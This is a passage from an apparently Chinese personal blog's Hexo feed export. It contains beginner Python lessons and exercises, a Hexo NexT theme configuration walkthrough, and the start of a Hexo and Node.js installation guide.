<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">*,a,b</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span>,<span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">get(a=<span class="number">1</span>,b=<span class="number">2</span>)  <span class="comment">#1,2</span></span><br><span class="line">get(<span class="number">1</span>,<span class="number">2</span>)   <span class="comment">#报错</span></span><br><span class="line">get(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)  <span class="comment">#报错</span></span><br></pre></td></tr></table></figure>

<p>命名关键字参数可以跟不定长参数混合使用。</p>
<h4 id="三、python中的内置函数"><a href="#三、python中的内置函数" class="headerlink" title="三、python中的内置函数"></a>三、python中的内置函数</h4><p>python中有一类函数，不需要我们去进行定义也不需要我们import进行引入就可以直接使用，称之为内置函数，这些内置函数都是很有用也是最常用的，下面的表格列出了一部分的内置函数。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>abs</code></td>
<td>返回一个数的绝对值，例如：<code>abs(-1.3)</code>会返回<code>1.3</code>。</td>
</tr>
<tr>
<td><code>bin</code></td>
<td>把一个整数转换成以<code>&#39;0b&#39;</code>开头的二进制字符串，例如：<code>bin(123)</code>会返回<code>&#39;0b1111011&#39;</code>。</td>
</tr>
<tr>
<td><code>chr</code></td>
<td>将Unicode编码转换成对应的字符，例如：<code>chr(8364)</code>会返回<code>&#39;€&#39;</code>。</td>
</tr>
<tr>
<td><code>hex</code></td>
<td>将一个整数转换成以<code>&#39;0x&#39;</code>开头的十六进制字符串，例如：<code>hex(123)</code>会返回<code>&#39;0x7b&#39;</code>。</td>
</tr>
<tr>
<td><code>input</code></td>
<td>从输入中读取一行，返回读到的字符串。</td>
</tr>
<tr>
<td><code>len</code></td>
<td>获取字符串、列表等的长度。</td>
</tr>
<tr>
<td><code>max</code></td>
<td>返回多个参数或一个可迭代对象中的最大值，例如：<code>max(12, 95, 37)</code>会返回<code>95</code>。</td>
</tr>
<tr>
<td><code>min</code></td>
<td>返回多个参数或一个可迭代对象中的最小值，例如：<code>min(12, 95, 37)</code>会返回<code>12</code>。</td>
</tr>
<tr>
<td><code>oct</code></td>
<td>把一个整数转换成以<code>&#39;0o&#39;</code>开头的八进制字符串，例如：<code>oct(123)</code>会返回<code>&#39;0o173&#39;</code>。</td>
</tr>
<tr>
<td><code>open</code></td>
<td>打开一个文件并返回文件对象。</td>
</tr>
<tr>
<td><code>ord</code></td>
<td>将字符转换成对应的Unicode编码，例如：<code>ord(&#39;€&#39;)</code>会返回<code>8364</code>。</td>
</tr>
<tr>
<td><code>pow</code></td>
<td>求幂运算，例如：<code>pow(2, 3)</code>会返回<code>8</code>；<code>pow(2, 0.5)</code>会返回<code>1.4142135623730951</code>。</td>
</tr>
<tr>
<td><code>print</code></td>
<td>打印输出。</td>
</tr>
<tr>
<td><code>range</code></td>
<td>构造一个范围序列，例如：<code>range(100)</code>会产生<code>0</code>到<code>99</code>的整数序列。</td>
</tr>
<tr>
<td><code>round</code></td>
<td>按照指定的精度对数值进行四舍五入，例如：<code>round(1.23456, 4)</code>会返回<code>1.2346</code>。</td>
</tr>
<tr>
<td><code>sum</code></td>
<td>对一个序列中的项从左到右进行求和运算，例如：<code>sum(range(1, 101))</code>会返回<code>5050</code>。</td>
</tr>
<tr>
<td><code>type</code></td>
<td>返回对象的类型，例如：<code>type(10)</code>会返回<code>int</code>；而<code>type(&#39;hello&#39;)</code>会返回<code>str</code>。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>基础练习一</title>
    <url>/post/f21c6418.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——基础练习一</p>
</blockquote>
<hr>
<span id="more"></span>

<h5 id="1、Examples-01"><a href="#1、Examples-01" class="headerlink" title="1、Examples 01"></a>1、Examples 01</h5><blockquote>
<p>百分制成绩转换为等级制成绩。</p>
<p><strong>要求</strong>：如果输入的成绩在90分以上（含90分）输出A；80分-90分（不含90分）输出B；70分-80分（不含80分）输出C；60分-70分（不含70分）输出D；60分以下输出E。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">P_to_G</span>(<span class="params">score</span>):</span><br><span class="line">    <span class="keyword">if</span> score &lt; <span class="number">60</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> score &gt;=<span class="number">60</span> <span class="keyword">and</span> score &lt; <span class="number">70</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> score &gt;=<span class="number">70</span> <span class="keyword">and</span> score &lt; <span class="number">80</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> score &gt;=<span class="number">80</span> <span class="keyword">and</span> score &lt; <span class="number">90</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    score = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&#x27;输入百分制成绩：&#x27;</span>))</span><br><span class="line">    P_to_G(score)</span><br></pre></td></tr></table></figure>



<h5 id="2、Examples-02"><a href="#2、Examples-02" class="headerlink" title="2、Examples 02"></a>2、Examples 02</h5><blockquote>
<p>输入一个正整数判断它是不是素数。（写一个函数）</p>
<p><strong>提示</strong>：素数指的是只能被1和自身整除的大于1的整数。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">prime</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">if</span> number &gt; <span class="number">1</span>:</span><br><span class="line">        is_prime=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,number):</span><br><span class="line">            <span class="keyword">if</span> number % i == <span class="number">0</span>:</span><br><span class="line">                is_prime = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> is_prime == <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;素数&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;不是素数&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;输入不符合要求&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;输入大于一的正整数：&#x27;</span>))</span><br><span class="line">    prime(number)</span><br></pre></td></tr></table></figure>



<h5 id="3、Examples-03"><a href="#3、Examples-03" class="headerlink" title="3、Examples 03"></a>3、Examples 03</h5><blockquote>
<p>寻找水仙花数。</p>
<p><strong>说明</strong>：水仙花数也被称为超完全数字不变数、自恋数、自幂数、阿姆斯特朗数，它是一个3位数，该数字每个位上数字的立方之和正好等于它本身，例如：$ 153&#x3D;1^3+5^3+3^3 $。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">    hundred = i // <span class="number">100</span></span><br><span class="line">    ten = i % <span class="number">100</span> // <span class="number">10</span></span><br><span class="line">    single = i % <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> hundred ** <span class="number">3</span> + ten ** <span class="number">3</span> + single ** <span class="number">3</span> == i:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>是水仙花数&quot;</span>)</span><br></pre></td></tr></table></figure>



<h5 id="4、Examples-04"><a href="#4、Examples-04" class="headerlink" title="4、Examples 04"></a>4、Examples 04</h5><blockquote>
<p>设计一个生成验证码的函数。</p>
<p><strong>说明</strong>：验证码由数字和英文大小写字母构成，长度可以用参数指定。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">random模块的choices函数可以实现有放回的抽样</span></span><br><span class="line"><span class="string">string.digits：包含数字0~9的字符串</span></span><br><span class="line"><span class="string">string.ascii_letters：所有字母</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ALL_CHARS = string.digits + string.ascii_letters</span><br><span class="line"></span><br><span class="line"><span class="comment"># code_len表示验证码长度，默认为4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">code_len=<span class="number">4</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(ALL_CHARS, k=code_len))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(generate_code(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>



<h5 id="5、Examples-05"><a href="#5、Examples-05" class="headerlink" title="5、Examples 05"></a>5、Examples 05</h5><blockquote>
<p><strong>题目</strong>：用户随机输入 N 个英文字母，使用 dict 统计用户输入的每个字母的次数 。 比如，输入：FUWAHUHSDFJYULFSDHJ，输出：{‘F’: 3, ‘U’: 3, ‘W’: 1, ‘A’: 1, ‘H’: 3, ‘S’: 2, ‘D’: 2, ‘J’: 2, ‘Y’: 1, ‘L’: 1}</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Count</span>(<span class="params">n</span>):</span><br><span class="line">    count_dict=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">            count_dict[i] = count_dict.get(i,<span class="number">0</span>) +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count_dict</span><br><span class="line"></span><br><span class="line">n=<span class="built_in">input</span>(<span class="string">&#x27;输入N个英文字母：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(Count(n))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next博客主题文件美化</title>
    <url>/post/6ece4714.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：hexo+next博客美化——主题文件美化</p>
</blockquote>
<hr>
<span id="more"></span>

<p>从这一篇博客起正式开始博客美化的说明。</p>
<h4 id="一、备用主题配置文件"><a href="#一、备用主题配置文件" class="headerlink" title="一、备用主题配置文件"></a>一、备用主题配置文件</h4><p>上一篇博客有提过备用主题配置文件，使用这种方法来改变主题配置不会原有配置文件配置改动，在主题升级时不会造成配置冲突配置被覆盖等情况。</p>
<p>做法：复制主题配置文件到博客目录上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp themes/next/_config.yml  _config.next.yml</span><br></pre></td></tr></table></figure>

<p>这样我们就可以使用备用主题文件来改变配置了。</p>
<h4 id="二、站点配置文件配置"><a href="#二、站点配置文件配置" class="headerlink" title="二、站点配置文件配置"></a>二、站点配置文件配置</h4><h5 id="1、配置站点信息"><a href="#1、配置站点信息" class="headerlink" title="1、配置站点信息"></a>1、配置站点信息</h5><p>站点信息主要配置站点标题、作者以及站点使用的语言类型，其余的可以保持默认，当然也可以根据个人需求来配置其他项。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">title: 站点标题</span><br><span class="line">subtitle: &#x27;&#x27;</span><br><span class="line">description: &#x27;&#x27;</span><br><span class="line">keywords:</span><br><span class="line">author: 作者</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="2、配置URL"><a href="#2、配置URL" class="headerlink" title="2、配置URL"></a>2、配置URL</h5><p>博客后面是需要上传到github或其他托管平台上的，这里的url则是访问博客网站的网址，其余的先不用改。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: https://blog.z7sz.top</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true </span><br><span class="line">  trailing_html: true</span><br></pre></td></tr></table></figure>

<h5 id="3、tab字符配置"><a href="#3、tab字符配置" class="headerlink" title="3、tab字符配置"></a>3、tab字符配置</h5><p>Writing中有一个tab也就是制表符的替换符号配置，我这边建议用4个空格来代替tab。Writing中其他配置可以参考前两篇博客的站点配置文件介绍来自行配置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tab_replace: &#x27;    &#x27;</span><br></pre></td></tr></table></figure>

<h5 id="4、主题更改"><a href="#4、主题更改" class="headerlink" title="4、主题更改"></a>4、主题更改</h5><p>主题记得更改为next主题</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>

<p>deploy在第一篇hexo搭建有讲过，这里就不讲了。站点配置文件的内容比较少，大概就这些，前面的一篇博客我也有详细的介绍过这个文件中的配置，想配置其他项的可以按照我那篇博客来更改配置。需要注意的是，改动站点配置文件时需要重新启动本地服务器，不然配置是不生效的，主题配置文件由于使用的备用主题配置文件的方法，所每次配置完也需要重新启动本地服务器。</p>
<h4 id="三、主题配置文件配置"><a href="#三、主题配置文件配置" class="headerlink" title="三、主题配置文件配置"></a>三、主题配置文件配置</h4><h5 id="1、视图选择"><a href="#1、视图选择" class="headerlink" title="1、视图选择"></a>1、视图选择</h5><p>我个人比较喜欢Gemini，所以在Schemes配置中将视图选择更改为Gemini，我们需要在备用配置文件中更改配置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Schemes</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">scheme: Muse</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">scheme: Mist</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">scheme: Pisces</span></span><br><span class="line">scheme: Gemini</span><br></pre></td></tr></table></figure>

<h5 id="2、更改网站图标"><a href="#2、更改网站图标" class="headerlink" title="2、更改网站图标"></a>2、更改网站图标</h5><p>我们可以在favicon配置中更改我们想要的网站图标，网站图标建议放在图传网站上，不建议放在本地，放在本地可能会让访问速度变慢。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16-next.png</span><br><span class="line">  medium: /images/favicon-32x32-next.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br></pre></td></tr></table></figure>

<h5 id="3、增加页面版权信息"><a href="#3、增加页面版权信息" class="headerlink" title="3、增加页面版权信息"></a>3、增加页面版权信息</h5><p>我们可以在页面增加版权信息，版权信息增加在文章的结尾处。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">creative_commons:</span><br><span class="line">  post: true</span><br></pre></td></tr></table></figure>

<h5 id="4、配置菜单项"><a href="#4、配置菜单项" class="headerlink" title="4、配置菜单项"></a>4、配置菜单项</h5><p>在menu配置下，我们可以把需要的菜单项取消注释，我这里只需要首页、分类、归档以及标签，并且在menu_settings中把icons和badges都设置为true。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">about: /about/ || fa fa-user</span></span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable / Disable menu icons / item badges.</span></span><br><span class="line">menu_settings:</span><br><span class="line">  icons: true</span><br><span class="line">  badges: true</span><br></pre></td></tr></table></figure>

<h5 id="5、侧边栏设置"><a href="#5、侧边栏设置" class="headerlink" title="5、侧边栏设置"></a>5、侧边栏设置</h5><p>侧边栏设置主要有侧边栏方向、宽度、填充、偏移量等设置，我基本保持默认，主要增加侧边栏图像以及让图像显示为圆形，这个看个人喜好选择，我在上一篇博客也有详细说过。</p>
<h6 id="5-1、侧边栏图像设置"><a href="#5-1、侧边栏图像设置" class="headerlink" title="5.1、侧边栏图像设置"></a>5.1、侧边栏图像设置</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">avatar:</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Replace the default image and <span class="built_in">set</span> the url here.</span></span><br><span class="line">  url:  #/images/avatar.gif</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">If <span class="literal">true</span>, the avatar will be displayed <span class="keyword">in</span> circle.</span></span><br><span class="line">  rounded: true</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">If <span class="literal">true</span>, the avatar will be rotated with the cursor.</span></span><br><span class="line">  rotated: false</span><br></pre></td></tr></table></figure>

<h6 id="5-2、友链添加"><a href="#5-2、友链添加" class="headerlink" title="5.2、友链添加"></a>5.2、友链添加</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">links_settings:</span><br><span class="line">  icon: fa fa-link</span><br><span class="line">  title: 友链</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Available values: block | inline</span></span><br><span class="line">  layout: inline</span><br><span class="line"></span><br><span class="line">links:</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">Title: https://example.com</span></span><br><span class="line">  Coder-Sakura: http://mybot.top/blog/</span><br><span class="line">  Rj45: https://rj45mp.github.io/</span><br></pre></td></tr></table></figure>

<p>我这里把图标改成了link的图标，然后layout更改成inline</p>
<h6 id="5-3、侧边栏目录设置"><a href="#5-3、侧边栏目录设置" class="headerlink" title="5.3、侧边栏目录设置"></a>5.3、侧边栏目录设置</h6><p>侧边栏目录这里要把number设置为false，这个选项会自动添加目录序号，但是一般我们在写文章时都会添加序号，所以这里要设置为false。expand_all设置为true，会自动显示所有级别的目录，其余的保持默认即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Automatically add list number to toc.</span></span><br><span class="line">  number: false</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">If <span class="literal">true</span>, all words will placed on next lines <span class="keyword">if</span> header width longer <span class="keyword">then</span> sidebar width.</span></span><br><span class="line">  wrap: false</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">If <span class="literal">true</span>, all level of TOC <span class="keyword">in</span> a post will be displayed, rather than the activated part of it.</span></span><br><span class="line">  expand_all: true</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Maximum heading depth of generated toc.</span></span><br><span class="line">  max_depth: 6</span><br></pre></td></tr></table></figure>

<h5 id="6、页脚设置"><a href="#6、页脚设置" class="headerlink" title="6、页脚设置"></a>6、页脚设置</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">footer:</span><br><span class="line">  since: 2020</span><br><span class="line"></span><br><span class="line">  icon:</span><br><span class="line">    name: fa fa-user   </span><br><span class="line">    animated: true</span><br><span class="line">   </span><br><span class="line">  powered: false</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>页脚这里更改了站点开始时间，因为我博客是20年就创建了，所以就改为2020，更改了图标并且动态显示，然后把页脚的强力驱动给隐藏了，如果大家的域名有备案的话，还可以修改备案信息。</p>
<h5 id="7、帖子配置"><a href="#7、帖子配置" class="headerlink" title="7、帖子配置"></a>7、帖子配置</h5><p>帖子配置这里暂时先修改一下文章底部tag标签的图标，其余美化配置涉及到第三方插件，后面再讲。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tag_icon: true</span><br></pre></td></tr></table></figure>

<h5 id="8、自定义页面"><a href="#8、自定义页面" class="headerlink" title="8、自定义页面"></a>8、自定义页面</h5><h6 id="8-1、自定义标签页面"><a href="#8-1、自定义标签页面" class="headerlink" title="8.1、自定义标签页面"></a>8.1、自定义标签页面</h6><p>前面菜单项把标签页和分类页取消注释了，但是我们访问这两个页面的时候肯定是不行的，因为还没有创建前端页面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建tags目录，注意要在博客目录下执行以下命令</span><br><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure>

<p>命令执行成功后，会在source目录下创建tags目录，并且自动新建index.md文件，接下来修改这个文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;标签&quot;</span><br><span class="line">date: 2022-06-18 17:35:53</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>修改完之后标签页面就创建好了。</p>
<h6 id="8-2、自定义分类页面"><a href="#8-2、自定义分类页面" class="headerlink" title="8.2、自定义分类页面"></a>8.2、自定义分类页面</h6><p>跟自定义标签页面过程差不多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>

<p>修改文件内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">title: &quot;分类&quot;</span><br><span class="line">date: 2022-06-18 17:42:22</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure>

<h6 id="8-3、自定义404页面"><a href="#8-3、自定义404页面" class="headerlink" title="8.3、自定义404页面"></a>8.3、自定义404页面</h6><p>一个网站怎么能没有404页面呢，404页面是很有必要的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page 404</span><br></pre></td></tr></table></figure>

<p>在404目录的index.md中添加以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 404 Not Found：该页无法显示</span><br><span class="line">date: 2022-06-18 17:45:22</span><br><span class="line">toc: false</span><br><span class="line">comments: false</span><br><span class="line">permalink: /404</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&lt;center&gt;404 Not Found&lt;/center&gt;</span><br><span class="line">&lt;center&gt; 对不起，您所访问的页面不存在或者已删除 &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;https://blog.z7sz.top/&quot;&gt;&lt;center&gt; 返回首页&lt;/center&gt; &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">* 我的Github：[https://github.com/z7sz](https://github.com/z7sz)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然，404页面可以自定义，这个看个人喜好。需要注意的是，访问不存在的资源是否可以重定向到 404 页面取决于网站托管服务或 Web 服务器的设置，而不是 Hexo。</p>
<h5 id="9、其他配置"><a href="#9、其他配置" class="headerlink" title="9、其他配置"></a>9、其他配置</h5><h6 id="9-1、代码块添加复制按钮以及样式"><a href="#9-1、代码块添加复制按钮以及样式" class="headerlink" title="9.1、代码块添加复制按钮以及样式"></a>9.1、代码块添加复制按钮以及样式</h6><p>在codeblock配置项中将copy_button的enable设置为true，style样式可以设置为mac，也可以设置成其他</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">codeblock:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure>

<h6 id="9-2、返回顶部设置"><a href="#9-2、返回顶部设置" class="headerlink" title="9.2、返回顶部设置"></a>9.2、返回顶部设置</h6><p>返回顶部我比较喜欢在侧边栏点击返回，并且显示阅读进度，这个看个人喜欢。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Back to top <span class="keyword">in</span> sidebar.</span></span><br><span class="line">  sidebar: true</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Scroll percent label <span class="keyword">in</span> b2t button.</span></span><br><span class="line">  scrollpercent: true</span><br></pre></td></tr></table></figure>

<h6 id="9-3、顶部显示阅读进度条"><a href="#9-3、顶部显示阅读进度条" class="headerlink" title="9.3、顶部显示阅读进度条"></a>9.3、顶部显示阅读进度条</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  height: 4px</span><br></pre></td></tr></table></figure>

<p>这篇博客的网站美化内容就到这里，我们一个大致的网站已经出来了，可以直接用当博客网站使用，当然，这个网站看起来还没有那么美观，我们接下来还需要继续优化，比如调整样式、使用第三方插件增加功能等。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next博客搭建</title>
    <url>/post/760a85eb.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：hexo+next博客搭建</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h4><p>服务器环境：Ubuntu 20.04 <br>nodejs版本：v18.3.0 <br>npm版本：8.12.2  <br>hexo版本：6.2.0  <br>next主题版本：v8.12.1</p>
<h4 id="二、开始安装"><a href="#二、开始安装" class="headerlink" title="二、开始安装"></a>二、开始安装</h4><h5 id="1、安装nodejs以及npm"><a href="#1、安装nodejs以及npm" class="headerlink" title="1、安装nodejs以及npm"></a>1、安装nodejs以及npm</h5><p>关于nodejs和npm的安装，网上有很多的方法，我用的是源码安装，但是缺点就是make编译的时间很长，优点则是可以选择安装的版本。</p>
<p>nodejs18.3.0下载地址：<a href="https://nodejs.org/dist/v18.3.0/node-v18.3.0.tar.gz">https://nodejs.org/dist/v18.3.0/node-v18.3.0.tar.gz</a></p>
<p>下载完之后上传到服务器上，然后解压文件并安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar xvf node-v18.3.0.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">cd node-v18.3.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">cp /usr/local/bin/node /usr/sbin/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新npm</span></span><br><span class="line">npm install -g npm</span><br></pre></td></tr></table></figure>

<h5 id="2、安装hexo"><a href="#2、安装hexo" class="headerlink" title="2、安装hexo"></a>2、安装hexo</h5><h6 id="2-1、下载cnpm"><a href="#2-1、下载cnpm" class="headerlink" title="2.1、下载cnpm"></a>2.1、下载cnpm</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<h6 id="2-2、使用cnpm安装hexo-cli"><a href="#2-2、使用cnpm安装hexo-cli" class="headerlink" title="2.2、使用cnpm安装hexo-cli"></a>2.2、使用cnpm安装hexo-cli</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<h4 id="三、生成hexo博客"><a href="#三、生成hexo博客" class="headerlink" title="三、生成hexo博客"></a>三、生成hexo博客</h4><h5 id="1、初始化hexo博客"><a href="#1、初始化hexo博客" class="headerlink" title="1、初始化hexo博客"></a>1、初始化hexo博客</h5><p>在博客的目录下操作，我的博客目录是hexo_blog，这个自定义就好了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p>执行完命令后我们就成功的初始化了一个博客，启动后就可以访问。但是一般初始化后的hexo版本并不是最新的，像我刚开始初始化后的版本是5.4.2，所以如果想更新hexo及插件版本的话可以接着往下看更新hexo的内容</p>
